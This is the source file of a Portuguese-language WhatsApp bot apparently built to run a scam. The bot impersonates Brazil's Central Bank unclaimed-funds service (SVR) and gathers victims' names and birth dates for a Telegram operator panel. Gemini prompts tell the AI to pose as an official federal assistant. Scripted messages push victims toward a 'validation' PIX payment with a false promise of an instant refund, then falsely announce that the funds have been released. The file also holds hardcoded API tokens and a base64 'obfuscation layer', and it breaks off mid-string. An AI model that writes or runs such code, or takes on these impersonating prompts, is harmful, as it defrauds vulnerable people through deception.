const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const QRCode = require('qrcode');
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

const BT = '```'; // Monospace marker for WhatsApp

// --- OBFUSCATION LAYER ---
const _d = (b) => Buffer.from(b, 'base64').toString('utf-8');

let API_URL = (process.env.SVR_SYS_CORE_URL || 'https://www.consultarvaloresareceber.com.br').replace(/\/$/, "");

if (API_URL.includes("discloud.app")) {
    console.log("⚠️ [SEGURANÇA] URL Discloud legado detectado. Corrigindo para o domínio principal...");
    API_URL = "https://www.consultarvaloresareceber.com.br";
}

const API_HEADERS = {
    'User-Agent': 'SVR-BOT-NODE-RUNTIME/5.0 (ShardCloud-Environment)',
    'X-SVR-Bot-Token': '8643978397'
};

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "AIzaSyCe0RyNY95UPhE1woWTfsshjrZGtyFKAV8";

function mask(str) {
    if (!str) return "NÃO CONFIGURADO";
    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

console.log(`\n🤖 [SVR BOT] SISTEMA OPERACIONAL`);
console.log(`---------------------------------------------`);
console.log(`📡 ENDPOINT: ${API_URL}`);
console.log(`🛡️ SEGURANÇA: ATIVA`);
console.log(`---------------------------------------------\n`);

// --- PROMPTS DE IA ---
// Prompt para mensagens espontâneas iniciais (antes do cadastro)
const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.

Mensagem do cidadão:`;

// Prompt para validação de data inválida
const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).

Mensagem do cidadão:`;

// Prompt para validação de nome inválido
const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).

Mensagem do cidadão:`;

// Prompt para mensagens durante a fila de espera
const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.

⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.

Mensagem do cidadão durante a espera:`;

async function askAI(prompt, userMessage) {
    if (!GEMINI_KEY) return null;
    try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
        const response = await axios.post(url, {
            contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
        }, { timeout: 15000 }); // Adicionado timeout de 15s
        return response.data.candidates[0].content.parts[0].text || null;
    } catch (e) {
        console.error('❌ [IA] Erro ao chamar Gemini:', e.message);
        return null;
    }
}

// --- RESET DE DADOS NO INÍCIO ---
const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');
const QUEUE_FILE = path.join(process.cwd(), 'waiting-queue.json');

// Pegamos o ID do bot agora para saber qual pasta de sessão apagar
const botIdArgStart = process.argv.find(a => a.startsWith('--id='));
const START_BOT_ID = botIdArgStart ? botIdArgStart.split('=')[1] : 'main';
const AUTH_FOLDER = path.join(process.cwd(), '.wwebjs_auth', `session-${START_BOT_ID}`);

try {
    // Limpa dados de leads
    if (fs.existsSync(SESSIONS_FILE)) {
        fs.unlinkSync(SESSIONS_FILE);
        console.log('🗑️ [SISTEMA] Sessões (leads) resetadas para novo ciclo.');
    }
    if (fs.existsSync(QUEUE_FILE)) {
        fs.unlinkSync(QUEUE_FILE);
        console.log('🗑️ [SISTEMA] Fila de leads resetada.');
    }
    
    // Limpa sessão do WhatsApp para forçar novo QR Code
    // REMOVIDO: A sessão não deve ser limpa ao reiniciar o servidor para manter o bot conectado
    // if (fs.existsSync(AUTH_FOLDER)) {
    //     fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
    //     console.log(`🗑️ [SISTEMA] Sessão WhatsApp (${START_BOT_ID}) limpa. Novo QR será gerado.`);
    // }
} catch (e) { 
    console.error('⚠️ [SISTEMA] Erro ao resetar dados:', e.message); 
}

let chatSessions = new Map();

// --- LOCK DE PROCESSAMENTO POR LEAD ---
// Evita que duas mensagens simultâneas do mesmo lead causem respostas duplicadas
const processingLock = new Set();
const internalMessageChats = new Set(); // Guarda chatIds que estão recebendo mensagem do bot agora

// Remoção do rastreamento estrito de lastQrMsgId em arquivo
let lastQrMsgId = 0;

function saveQrMsgId(msgId) {
    lastQrMsgId = msgId;
}

async function sendBotMessage(chatId, text, options = {}) {
    internalMessageChats.add(chatId);
    try {
        const res = await client.sendMessage(chatId, text, options);
        return res;
    } catch (e) {
        console.error(`❌ [ERRO] Falha ao enviar mensagem para ${chatId}:`, e.message);
        throw e;
    } finally {
        // Delay menor para ser mais responsivo à intervenção do admin
        setTimeout(() => { internalMessageChats.delete(chatId); }, 2000);
    }
}

function loadSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SESSIONS_FILE, 'utf-8'));
            chatSessions = new Map(Object.entries(data));
            console.log(`📂 [SESSÕES] ${chatSessions.size} sessão(ões) restaurada(s).`);
        }
    } catch (e) { console.error('Erro ao carregar sessões:', e.message); }
}

function saveSessions() {
    try {
        const obj = Object.fromEntries(chatSessions);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj, null, 2));
    } catch (e) { console.error('Erro ao salvar sessões:', e.message); }
}

loadSessions();

// --- FILA DE ESPERA ---
// Guarda leads que já concluíram o cadastro e aguardam liberação manual
let waitingQueue = [];

function loadQueue() {
    try {
        if (fs.existsSync(QUEUE_FILE)) {
            waitingQueue = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf-8'));
            console.log(`📂 [FILA] ${waitingQueue.length} lead(s) na fila restaurado(s).`);
        }
    } catch (e) { console.error('Erro ao carregar fila:', e.message); }
}

function saveQueue() {
    try {
        fs.writeFileSync(QUEUE_FILE, JSON.stringify(waitingQueue, null, 2));
    } catch (e) { console.error('Erro ao salvar fila:', e.message); }
}

function addToQueue(chatId, name, birthDate) {
    // Evita duplicatas
    if (!waitingQueue.find(q => q.chatId === chatId)) {
        waitingQueue.push({ chatId, name, birthDate, joinedAt: Date.now() });
        saveQueue();
    }
}

function getQueuePosition(chatId) {
    const idx = waitingQueue.findIndex(q => q.chatId === chatId);
    return idx >= 0 ? idx + 1 : null;
}

function removeFromQueue(chatId) {
    waitingQueue = waitingQueue.filter(q => q.chatId !== chatId);
    saveQueue();
}

loadQueue();

// --- TELEGRAM ---
async function notifyTelegram(html, messageId, replyMarkup) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        if (messageId) {
            const payload = { chat_id: CHAT_ID, message_id: messageId, text: html, parse_mode: 'HTML' };
            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload, { timeout: 10000 });
            return res.data.result?.message_id || messageId;
        } else {
            const payload = { chat_id: CHAT_ID, text: html, parse_mode: 'HTML' };
            if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload, { timeout: 10000 });
            return res.data.result?.message_id || null;
        }
    } catch (e) {
        console.error('❌ [TELEGRAM] Falha ao notificar:', e.message);
        return null;
    }
}

async function notifyTelegramPhoto(buffer, caption) {
    if (!TG_TOKEN || !CHAT_ID) return null;
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'media.png', contentType: 'image/png' });
        form.append('caption', caption, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');

        const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 20000
        });
        return res.data.result?.message_id || null;
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar foto:', e.message);
        return null;
    }
}

// Monta o texto do painel de cadastro no Telegram (editável)
function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', humanStep = 0, isCalling = false) {
    const statusEmoji = {
        'preenchendo_data': '⏳',
        'preenchendo_nome': '⏳',
        'validado': '✅',
        'na_fila': '🕐',
        'human': '👤'
    }[status] || '⏳';

    const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
    const dataLabel = tipo === 'CNPJ' ? 'Data de Abertura' : 'Data de Nascimento';
    const nomeLabel = tipo === 'CNPJ' ? 'Razão Social' : 'Nome Completo';

    const nomeDisplay = nome ? `✅ <b>${nome}</b>` : `<i>⏳ Preenchendo...</i>`;
    const dataDisplay = dataNasc ? `✅ <b>${dataNasc}</b>` : `<i>⏳ Preenchendo...</i>`;

    let statusMsg = '';
    let callPulse = '';

    if (isCalling) {
        callPulse = '🔴 ';
        statusMsg = '📞 <b>EM LIGAÇÃO AGORA... (Falando com Lead)</b>';
    } else if (status === 'preenchendo_data') {
        statusMsg = '📝 <i>Aguardando data de nascimento...</i>';
    } else if (status === 'preenchendo_nome') {
        statusMsg = '📝 <i>Aguardando nome completo...</i>';
    } else if (status === 'validado') {
        statusMsg = '✅ <b>CADASTRO CONCLUÍDO — Enviado para a fila!</b>';
    } else if (status === 'na_fila') {
        const pos = getQueuePosition(chatId);
        statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
    } else if (status === 'human') {
        if (humanStep === 1) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: PENDENTE 📵)</b>';
        else if (humanStep === 2) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: CONCLUÍDA ✅)</b>';
        else if (humanStep >= 3) statusMsg = `👤 <b>EM ATENDIMENTO (Etapa ${humanStep} ATIVA)</b>`;
        else statusMsg = '👤 <b>ATENDIMENTO MANUAL ATIVO</b>';
    }

    const text = `${callPulse}${statusEmoji} <b>PAINEL DE CONTROLE DO LEAD</b>\n\n` +
        `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
        `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
        `📋 <b>Dados do Titular:</b>\n` +
        `• ${dataLabel}: ${dataDisplay}\n` +
        `• ${nomeLabel}: ${nomeDisplay}\n\n` +
        `📊 <b>Status:</b> ${statusMsg}`;

    const e2Label = humanStep >= 2 ? "📞 Etapa 2 ✅" : "📞 Etapa 2 (Pendente)";
    const e3Label = humanStep >= 3 ? "🔐 Etapa 3 ✅" : "🔐 Etapa 3 (Validação)";

    const reply_markup = {
        inline_keyboard: [
            [
                { text: e2Label, callback_data: `etapa:2:${chatId}` },
                { text: e3Label, callback_data: `etapa:3:${chatId}` }
            ],
            [
                { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_std:${chatId}` },
                { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }
            ],
            [
                { text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }
            ]
        ]
    };

    return { text, reply_markup };
}

// --- CLIENTE WHATSAPP ---
const botIdArg = process.argv.find(a => a.startsWith('--id='));
const BOT_ID = botIdArg ? botIdArg.split('=')[1] : 'main';
const STATUS_FILE = `bot-status-${BOT_ID}.json`;

console.log(`🤖 [BOT] Iniciando instância: ${BOT_ID} | Status: ${STATUS_FILE}`);

let lastQrNotification = 0;
let isBotReady = false;

const client = new Client({
    authStrategy: new LocalAuth({ clientId: BOT_ID, dataPath: '.wwebjs_auth' }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    }
});

client.on('qr', async (qr) => {
    if (isBotReady) return;
    console.log('\n📱 [QR CODE] Escaneie com o WhatsApp:\n');
    qrcode.generate(qr, { small: true });
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));

    const REFRESH_FLAG = 'refresh-qr.json';
    const isRefreshRequested = fs.existsSync(REFRESH_FLAG);

    if (isRefreshRequested) {
        try { fs.unlinkSync(REFRESH_FLAG); } catch(e) {}
    }

    try {
        const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
        const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
        
        const now = new Date();
        const expiresAt = new Date(now.getTime() + 45000); // QRs do whatsapp-web.js duram aprox 45s
        
        const caption = `📲 <b>QR CODE — ${slotLabel}</b>\n\n` +
                        `Escaneie com o WhatsApp para conectar o bot.\n\n` +
                        `⏳ <b>Gerado às:</b> ${now.toLocaleTimeString('pt-BR')}\n` +
                        `⚠️ <b>Expira às:</b> ${expiresAt.toLocaleTimeString('pt-BR')} (Válido por 45s)\n\n` +
                        `<i>Após este horário, o QR pode expirar. Caso não conecte, clique no botão abaixo para atualizar.</i>`;
        const kb = { 
            inline_keyboard: [
                [{ text: "🔄 Gerar Novo QR Code", callback_data: "cmd:refresh_qr" }],
                [{ text: "📱 Mudar Número WhatsApp", callback_data: "painel:change_whatsapp_num" }]
            ] 
        };

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
        form.append('caption', caption, { contentType: 'text/plain' });
        form.append('parse_mode', 'HTML');
        form.append('reply_markup', JSON.stringify(kb));

        const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            timeout: 15000
        });
        if (res.data?.result) {
            saveQrMsgId(res.data.result.message_id);
            console.log('✅ [TELEGRAM] QR Code enviado/atualizado. ID:', lastQrMsgId);
        }
    } catch (e) {
        console.error('❌ [TELEGRAM] Erro ao enviar QR Code:', e.message);
    }
});

client.on('ready', async () => {
    if (isBotReady) return; // Evita múltiplas notificações de conexão
    isBotReady = true;

    console.log('✅ [BOT] WhatsApp conectado e pronto!');
    let adminName = BOT_ID === 'main' ? 'Perfil 1' : BOT_ID;
    try {
        const info = client.info;
        if (info && info.pushname) adminName = info.pushname;
    } catch (e) { }
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'CONNECTED', adminName, ts: Date.now() }));
    
    const caption = `✅ <b>${BOT_ID.toUpperCase()} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`;
    if (lastQrMsgId) {
        // Tenta editar a mensagem do QR para a de sucesso
        try {
            await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageCaption`, {
                chat_id: CHAT_ID,
                message_id: lastQrMsgId,
                caption,
                parse_mode: 'HTML'
            });
            console.log('✅ [TELEGRAM] Mensagem de QR Code atualizada para sucesso.');
            lastQrMsgId = 0;
        } catch (e) {
            console.error('❌ [TELEGRAM] Erro ao editar caption:', e.message);
            notifyTelegram(caption);
        }
    } else {
        notifyTelegram(caption);
    }
});

client.on('incoming_call', async (call) => {
    if (BOT_ID !== 'main') return;
    const targetChatId = call.from;
    const currentSession = chatSessions.get(targetChatId);

    console.log(`📞 [INCOMING] Chamada de ${targetChatId}`);

    if (currentSession) {
        currentSession.isCalling = true;
        chatSessions.set(targetChatId, currentSession);

        if (currentSession.tgMsgId) {
            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
        }
    }
});

client.on('disconnected', (reason) => {
    console.log('⚠️ [BOT] Desconectado:', reason);
    isBotReady = false;
    fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'DISCONNECTED', reason, ts: Date.now() }));
});

// =============================================================
// HANDLER 1: 'message_create' — SOMENTE para detectar quando o
// admin digita manualmente e assume o atendimento de um lead.
// NÃO processa mensagens recebidas aqui para evitar confusão.
// =============================================================

// Mensagem formal enviada automaticamente quando o operador assume
const MENSAGEM_OPERADOR_ASSUME = `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal SVR, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.

Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.

📋 *ETAPAS OBRIGATÓRIAS PARA LIBERAÇÃO:*

*1ª Etapa — Autenticação de Identidade:* ✅ Concluída
Validação dos dados cadastrais do titular perante os registros do Banco Central do Brasil.

*2ª Etapa — Validação Jurídica do Processo:* 🔄 Em andamento
Análise e homologação do pedido de resgate junto ao Departamento de Ativos Não Reclamados.

*3ª Etapa — Confirmação do Canal de Recebimento:* ⏳ Pendente
Verificação e habilitação da conta de destino para transferência dos valores resgatados.

*4ª Etapa — Liberação e Transferência dos Valores:* ⏳ Pendente
Processamento final e crédito dos ativos financeiros na conta indicada pelo titular.

⚠️ *IMPORTANTE:* Todas as etapas são *obrigatórias e insubstituíveis*, conforme determina o protocolo de segurança do Sistema de Valores a Receber (SVR). A não conclusão de qualquer etapa *suspende automaticamente* o processo de resgate, podendo resultar no retorno dos valores ao Fundo Garantidor.

Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de forma segura, sigilosa e dentro dos prazos legalmente estabelecidos.

_Contamos com sua colaboração e compreensão._

*Portal SVR — Banco Central do Brasil*
*CNPJ: 00.038.166/0001-05*
_Este canal é monitorado e possui validade jurídica._`;

// --- MENSAGENS POR ETAPA ---
const MENSAGEM_ETAPA_2_CONCLUIDA =
    `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
*Departamento de Liberação de Ativos Financeiros*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

✅ *A Validação Jurídica do seu processo foi concluída com êxito.*

Nosso operador especializado confirmou a titularidade e a autenticidade dos seus dados perante o Departamento de Ativos Não Reclamados do Banco Central do Brasil.

📋 *STATUS ATUALIZADO DAS ETAPAS:*

✅ 1ª Etapa — Autenticação de Identidade: *CONCLUÍDA*
✅ 2ª Etapa — Validação Jurídica do Processo: *CONCLUÍDA*
⏳ 3ª Etapa — Confirmação do Canal de Recebimento: *PENDENTE*
⏳ 4ª Etapa — Liberação e Transferência dos Valores: *PENDENTE*

Nosso operador dará continuidade ao processo em instantes. Permaneça disponível.

*Portal SVR — Banco Central do Brasil*
_Este processo possui registro jurídico e validade legal._`;

const MENSAGEM_ETAPA_3 =
    `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
*Departamento de Segurança Financeira — Portal SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Para garantir a integridade da transferência dos seus ativos, o sistema exige a realização de um procedimento de *Validação de Vínculo Bancário*. 

⚠️ *ESCLARECIMENTO:* Este procedimento *NÃO* é uma transação comercial, mas sim uma autenticação obrigatória da conta bancária que irá receber os valores. O protocolo gera um *Vínculo de Segurança* entre o Banco Central e sua conta.

📋 *DADOS DO PROTOCOLO DE VALIDAÇÃO:*

🔹 *Protocolo:* #VAL-SVR-CONFIRM
🔹 *Validade:* 15 Minutos (Expirável)
🔹 *Finalidade:* Habilitação de canal para recebimento de ativos.

✅ *REEMBOLSO IMEDIATO:* Assim que a validação for processada pelo sistema, o valor utilizado para autenticação será *ESTORNADO INSTANTANEAMENTE* para sua conta, somado ao valor total dos seus ativos recuperados.

O sistema processará o estorno de forma automática via PIX em até 60 segundos após a confirmação do protocolo.

Aguarde o envio das instruções de validação (Código Hash de Autenticação).

*Portal SVR — Banco Central do Brasil*
_Processo regido pela Resolução BCB nº 318/2023._`;

const MENSAGEM_ETAPA_4 =
    `🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
*Departamento de Rastreamento de Ativos — SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que o seu *Protocolo Privado de Segurança* foi gerado com êxito pelo sistema federal de ativos.

🖥️ *STATUS DO SISTEMA:*
${BT}
ID: #SVR-PROT-OK
STATUS: PRONTO_PARA_USO
TYPE: CHAVE_HASH_CRIPTOGRAFADA
VINCULO: ATIVO
${BT}

✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.
⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.

*Portal SVR — Banco Central do Brasil*`;
const MENSAGEM_ETAPA_5 =
    `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
*Departamento de Execução Financeira — Portal SVR*
━━━━━━━━━━━━━━━━━━━━━━━━━━━

Prezado(a) Titular,

Informamos que o seu processo de resgate foi *100% HOMOLOGADO E FINALIZADO* com sucesso.

📋 *DETALHES DO CRÉDITO:*

🔹 *ID Transação:* #SVR-PIX-RELEASE
🔹 *Status:* CONCLUÍDO
🔹 *Tipo:* TRANSFERÊNCIA PRIORITÁRIA (TED/PIX)
🔹 *Prazo para Crédito:* Imediato (Dependendo da compensação interna do seu banco)

✅ O montante total foi liberado e já se encontra em fase de processamento bancário para crédito na sua conta informada. 

Agradecemos por utilizar os canais oficiais do Banco Central do Brasil para a recuperação de seus ativos financeiros.

*Portal SVR — Banco Central do Brasil*
_Processo 100% Homologado e Finalizado._`;

const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvcmVzIFMuQS4iLCIxMDEiOiJSZW5hc2NlbmNhIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTAyIjoiWHAgSW52ZXN0aW1lbnRvcyBDb3JyZXRvcmEgZGUgQ8OibWJpbyxUw610dWxvcyBkIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMvQSIsIjEwNCI6IkNhaXhhIEVjb25vbWljYSBGZWRlcmFsIiwiMTA1IjoiTGVjY2EgQ3LDqWRpdG8iLCIxMDciOiJCYW5jbyBCb2NvbSBCYm0gUy5BLiIsIjEwOCI6IlBvcnRvY3JlZCBTLkEuIC0gQ3JlZGl0byIsIjExMSI6Ik9saXZlaXJhIFRydXN0IERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQS4iLCIxMTMiOiJNYWdsaWFubyBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMTE0IjoiQ2VudHJhbCBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBObyBFc3RhZG8gRG8gRXNww61yaXRvIFNhbnRvIC0gQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYSIsIjExOSI6IkJhbmNvIFdlc3Rlcm4gVW5pb24gRG8gQnJhc2lsIFMuQS4iLCIxMjAiOiJCYW5jbyBSb2RvYmVucyBTLkEuIiwiMTIxIjoiQmFuY28gQWdpYmFuayBTLkEuIiwiMTIyIjoiQmFuY28gQnJhZGVzY28gQmVyaiBTLkEuIiwiMTI0IjoiQmFuY28gV29vcmkgQmFuayBEbyBCcmFzaWwgUy5BLiIsIjEyNSI6IlBsdXJhbCBTLkEuIEJhbmNvIE3Dumx0aXBsbyIsIjEyNiI6IkJyIFBhcnRuZXJzIEJhbmNvIERlIEludmVzdGltZW50byBTLkEuIiwiMTI3IjoiQ29kZXBlIENvcnJldG9yYSBEZSBWYWxvcmVzIEUgQ8OibWJpbyBTLkEuIiwiMTI4IjoiTXMgQmFuayBTLkEuIEJhbmNvIERlIEPDom1iaW8iLCIxMjkiOiJVYnMgQnJhc2lsIEJhbmNvIGRlIEludmVzdGltZW50byBTLkEuIiwiMTMwIjoiQ2FydWFuYSBTLkEuIC0gU29jaWVkYGFkZSBEZSBDcsOpZGl0byIsIjEzMSI6IlR1bGxldHQgUHJlYm9uIEJyYXNpbCBDb3JyZXRvcmEgZGUgVmFsb3JlcyBlIEPDom1iaW8gTHRkYSIsIjEzMiI6IkljYmMgRG8gQnJhc2lsIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiMTMzIjoiQmFuY28gQ3JlZ29sIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBEZSBDcsOpZGl0byBlIEVjb25vbWlhIEZhbWlsaWFyIGUgU29saWTDoXJpYSIsIjEzNCI6IkJnYyBMaXF1aWRleiBEaXN0cmlidWlkb3JhIERlIFTDtXR1bG9zIEUgVmFsb3JlcyBNb2JpbGnDoXJpb3MgTHRkYSIsIjEzNiI6IlVuaWNyZWQgRG8gQnJhc2lsIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBVbmljcmVkIEx0ZGEuIiwiMTM4IjoiR2V0IE1vbmV5IENvcnJldG9yYSBEZSBDw6JtYmlvIFMuQS4iLCIxMzkiOiJJbnRlc2EgU2FucGFvbG8gQnJhc2lsIFMuQS4gLSBCYW5jbyBNdWx0aXBsbyIsIjE0MCI6IkVhc3ludmVzdCAtIFTDrXR1bG8gQ29ycmV0b3JhIERlIFZhbG9yZXMgU2EiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMTQzIjoiVHJldmlzbyBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTQ0IjoiQmV4cyBCYW5jbyBEZSBDw6JtYmlvIFMvQSIsIjE0NSI6IkxldnljYW0gLSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEUgVmFsb3JlcyBMdGRhLiIsIjE0NiI6Ikd1aXR0YSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEx0ZGEuIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSBTLkEuIC0gQ3LDqWRpdG8gRmluYW5jaWFtZW50byBlIEludmVzdGltZW50byIsIjE1NyI6IkljYXAgRG8gQnJhc2lsIENvcnJldG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEuIiwiMTU5IjoiQ2FzYSBEbyBDcsOpZGl0byBTLkEuIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciIsIjE2MyI6IkNvbW1lcnpiYW5rIEJyYXNpbCBTLkEuIC0gQmFuY28gTcO6bHRpcGxvIiwiMTY5IjoiQmFuY28gT2zDqSBDb25zaWduYWRvIFMuQS4iLCIxNzMiOiJCcmwgVHJ1c3QgRGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIxNzQiOiJQZWZpc2EgUy5BLiAtIENyw6lkaXRvIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyBTLkEuIENvcnJldG9yYSBEZSBWYWxvcmVzIiwiMTgwIjoiQ20gQ2FwaXRhbCBNYXJrZXRzIENvcnJldG9yYSBEZSBDw6JtYmlvLCBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEiLCIxODMiOiJTb2NyZWQgUy5BLiAtIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciBlIGEgRW1